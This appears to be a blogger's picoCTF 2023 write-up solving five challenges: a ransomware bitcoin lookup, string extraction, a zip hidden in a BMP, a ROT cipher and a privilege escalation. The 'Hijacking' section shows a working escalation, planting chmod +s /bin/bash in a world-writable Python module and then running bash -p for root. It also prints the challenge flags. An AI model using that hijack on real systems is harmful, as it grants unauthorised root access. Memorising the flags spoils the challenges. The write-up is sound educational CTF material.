---
layout: default
title : n16hth4wk - picoCTF 2023 Writeup
---

### CTF Overview

picoCTF is a computer security game targeted at middle and high school students. The game consists of a series of challenges centered around a unique storyline where participants must reverse engineer, break, hack, decrypt, or do whatever it takes to solve the challenge. The challenges are all set up with the intent of being hacked, making it an excellent, legal way to get hands-on experience.

The Competition involves trying to solve a designated number of problems within a specified timeframe. The Competition begins on 14 March 2023 at 12:00pm Eastern Daylight Time (17:00 Monday, West Africa Time WAT) and continues until 28 March 2023 at 3:00pm Eastern Daylight Time (20:00 Monday, West Africa Time WAT) (the "Competition Period").

Enough with the talk let's get down to pwning 😉

## General Skill challenge solved by nighthawk

### money-ware - 100pts

![image](https://user-images.githubusercontent.com/87468669/228119891-1c5bfbec-bf10-4ed3-b1c0-35f6d5b4108f.png)

hmmmm we got a bitcoin address `1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX` and we are asked to identify what scam the address was used to for. 

![image](https://user-images.githubusercontent.com/87468669/228120610-c9fcc611-e50b-445c-891c-43f36b0ba090.png)

after a few research i found a site [scam](https://scam-alert.io/) to info about this scam address. 

![image](https://user-images.githubusercontent.com/87468669/228120946-3a7bb4b5-c0d0-4ae7-8bf9-593ac8b91f58.png)

and boom we got it... The payment address for the `PETYA` ransomware scam.

final flag - picoCTF{Petya}


## Reverse Engineering challenge solved by nighthawk

### Reverse - 100pts 

![image](https://user-images.githubusercontent.com/87468669/228121406-7d1c9cc3-e051-425f-b7f8-11045ce1d7d6.png)

we are asked to reverse a file 🤔... let's download this file 

```
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp]
└─$ wget https://artifacts.picoctf.net/c/273/ret                    
--2023-03-28 04:38:06--  https://artifacts.picoctf.net/c/273/ret
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.224.81.15, 13.224.81.92, 13.224.81.5, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.224.81.15|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16888 (16K) [application/octet-stream]
Saving to: ‘ret’

ret                                       100%[====================================================================================>]  16.49K  --.-KB/s    in 0s      

2023-03-28 04:38:08 (32.4 MB/s) - ‘ret’ saved [16888/16888]
```
downloaded the file using wget.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp]
└─$ file ret     
ret: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=64856d07d138e412faf30b9722d92f507e3b5c9c, for GNU/Linux 3.2.0, not stripped
```
checked what type of file it is using file, we can see it is not stripped so let's use strings to make the contents readable.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp]
└─$ strings ret     
[***]
picoCTF{H
3lf_r3v3H
r5ing_suH
cce55fulH
_d7b14d4H
[]A\A]A^A_
Enter the password to unlock this file: 
You entered: %s
Password correct, please see flag: picoCTF{3lf_r3v3r5ing_succe55ful_d7b14d43}
Access denied
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crtstuff.c
deregister_tm_clones
[***]
```
and boom we got the flag.

final flag - picoCTF{3lf_r3v3r5ing_succe55ful_d7b14d43}


## Forensics challenge solved by nighthawk

### Invisible WORDs - 300pts 

![image](https://user-images.githubusercontent.com/87468669/228126206-783a2a5f-caca-4c59-b4a0-2e6020d166e4.png)

we got an image file, let's download it.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp]
└─$ wget https://artifacts.picoctf.net/c/405/output.bmp
--2023-03-28 05:08:58--  https://artifacts.picoctf.net/c/405/output.bmp
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.224.81.5, 13.224.81.15, 13.224.81.40, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.224.81.5|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2073738 (2.0M) [application/octet-stream]
Saving to: ‘output.bmp’

output.bmp                                100%[====================================================================================>]   1.98M  2.45MB/s    in 0.8s    

2023-03-28 05:09:00 (2.45 MB/s) - ‘output.bmp’ saved [2073738/2073738]
```
let's analyse this file

![image](https://user-images.githubusercontent.com/87468669/228135799-2194c4b5-ef53-46e7-8afc-29565284af4a.png)

analyzing the file using hexeditor, we noticed another header which is a zip header `PK` 140 bytes away from the bmp header in the bmp file. let's extract the zip from this bmp file.

```
input_file = 'output.bmp'
output_file = 'extracted'

with open(input_file, 'rb') as f:
    data = f.read()

# Extract pixel data from BMP file
pixel_data = data[140:]
pixels = b''.join([pixel_data[i:i+2] for i in range(0, len(pixel_data), 4)])

# Write pixel data to output file
with open(output_file, 'wb') as f:
    f.write(pixels)
```
wrote a python script to extract the zip from the bmp file. 

```
──(n16hth4wk👽n16hth4wk-sec)-[/tmp/output]
└─$ ls -al
total 2048
drwxr-xr-x  2 n16hth4wk n16hth4wk    4096 Mar 28 16:52 .
drwxrwxrwt 16 root      root        12288 Mar 28 16:52 ..
-rw-r--r--  1 n16hth4wk n16hth4wk     334 Mar 28 16:48 extract.py
-rw-r--r--  1 n16hth4wk n16hth4wk 2073738 Mar 16 04:16 output.bmp
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp/output]
└─$ python extract.py
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp/output]
└─$ ls -al
total 3064
drwxr-xr-x  2 n16hth4wk n16hth4wk    4096 Mar 28 16:53 .
drwxrwxrwt 16 root      root        12288 Mar 28 16:52 ..
-rw-r--r--  1 n16hth4wk n16hth4wk 1036800 Mar 28 16:53 extracted
-rw-r--r--  1 n16hth4wk n16hth4wk     334 Mar 28 16:48 extract.py
-rw-r--r--  1 n16hth4wk n16hth4wk 2073738 Mar 16 04:16 output.bmp
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp/output]
└─$ file extracted
extracted: Zip archive data, at least v2.0 to extract, compression method=deflate
```
extracted the zip data from the bmp file. at first i tried using `unzip` to extract the content of the zid data, it failed so i used `binwalk`

```
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp/output]
└─$ binwalk -e extracted

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 169392, uncompressed size: 448642, name: ZnJhbmtlbnN0ZWluLXRlc3QudHh0
169576        0x29668         End of Zip archive, footer length: 22

                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp/output]
└─$ cd _extracted.extracted 
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp/output/_extracted.extracted]
└─$ ls -al
total 1464
drwxr-xr-x 2 n16hth4wk n16hth4wk    4096 Mar 28 16:59 .
drwxr-xr-x 3 n16hth4wk n16hth4wk    4096 Mar 28 16:59 ..
-rw-r--r-- 1 n16hth4wk n16hth4wk 1036800 Mar 28 16:59 0.zip
-rw-r--r-- 1 n16hth4wk n16hth4wk  448642 Mar 16 03:27 ZnJhbmtlbnN0ZWluLXRlc3QudHh0
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp/output/_extracted.extracted]
└─$ cat ZnJhbmtlbnN0ZWluLXRlc3QudHh0 | grep -i "Pico"
At that age I became acquainted with the celebrated picoCTF{w0rd_d4wg_y0u_f0und_5h3113ys_m4573rp13c3_539ea4a8}
```
and Boom we got the flag 

final flag - picoCTF{w0rd_d4wg_y0u_f0und_5h3113ys_m4573rp13c3_539ea4a8}


## Cryptography challenges done by nighthawk

### Rotation - 100pts

![image](https://user-images.githubusercontent.com/87468669/228305059-2ffd6e12-95f4-4fa2-b8a2-938195ef73cf.png)

we are asked to download an encrypted flag, let's download it and check the content.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp]
└─$ wget https://artifacts.picoctf.net/c/386/encrypted.txt
--2023-03-28 17:23:13--  https://artifacts.picoctf.net/c/386/encrypted.txt
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.224.81.40, 13.224.81.92, 13.224.81.5, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.224.81.40|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 37 [application/octet-stream]
Saving to: ‘encrypted.txt’

encrypted.txt                             100%[====================================================================================>]      37  --.-KB/s    in 0s      

2023-03-28 17:23:14 (31.1 MB/s) - ‘encrypted.txt’ saved [37/37]

                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp]
└─$ cat encrypted.txt 
xqkwKBN{z0bib1wv_l3kzgxb3l_4k71n5j0}
```
cool we got the encrypted flag, let try decrypt it using an online [decoder](https://www.dcode.fr/rot-cipher)

![image](https://user-images.githubusercontent.com/87468669/228306368-e0a94a66-1c55-420b-8cf1-f44545694a89.png)

and boom it's a rot 14 encryption and we got the flag.

final flag - picoCTF{r0tat1on_d3crypt3d_4c71f5b0}


## Binary Exploitation challenges done by nighthawk

### Hijacking - 200 pts 

![image](https://user-images.githubusercontent.com/87468669/228309224-e68101c4-5aa0-481a-861c-9b78df77b2d9.png)

in this challenge we were giving an instance to connect to using ssh, so let's login ssh with the creds.

```
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
picoctf@challenge:~$ 
```
after logging in, checked for sudo privileges and we can see that we are allowed to run `/usr/bin/python3 /home/picoctf/.server.py` as root without password. let's check the content of this file.

```
picoctf@challenge:~$ cat /home/picoctf/.server.py
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip) 
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)  
picoctf@challenge:~$ 
```
checking the content of the file, we can see it uses a `base64` module lib. let's hijack this module. 

```
picoctf@challenge:~$ find / -type f -name "base64.py" 2>/dev/null
/usr/lib/python3.8/base64.py
picoctf@challenge:~$ ls -al /usr/lib/python3.8/base64.py
-rwxrwxrwx 1 root root 20382 Nov 14 12:59 /usr/lib/python3.8/base64.py
picoctf@challenge:~$
```
cool we have write permission to the `base64.py` lib module file. let's edit and add malicious code to it. in our case we would make an suid bin.😸

![image](https://user-images.githubusercontent.com/87468669/228314791-ba22cb09-dd09-49fc-95a9-b1e0c79a4102.png)

edited the `base64.py` lib and put payload:

```
import os

os.system("chmod +s /bin/bash
```
saved and exit vim.

```
picoctf@challenge:~$ vim /usr/lib/python3.8/base64.py
picoctf@challenge:~$ ls -al /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
picoctf@challenge:~$ sudo -u root /usr/bin/python3 /home/picoctf/.server.py
sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip) 
socket.gaierror: [Errno -5] No address associated with hostname
picoctf@challenge:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
picoctf@challenge:~$ 
```
run the python file and boom we got an suid. let's escalate privs with this and get the flag.

```
picoctf@challenge:~$ /bin/bash -p
bash-5.0# cd root
bash: cd: root: No such file or directory
bash-5.0# cd /root
bash-5.0# ls -al
total 12
drwx------ 1 root root   23 Mar 16 02:08 .
drwxr-xr-x 1 root root   51 Mar 28 16:58 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   43 Mar 16 02:08 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
bash-5.0# cat .flag.txt 
picoCTF{pYth0nn_libraryH!j@CK!n9_13cfd3cc}
bash-5.0# 
```
running command `/bin/bash -p` got us root shell and we got the flag in the `/root` directory.

final flag - picoCTF{pYth0nn_libraryH!j@CK!n9_13cfd3cc}
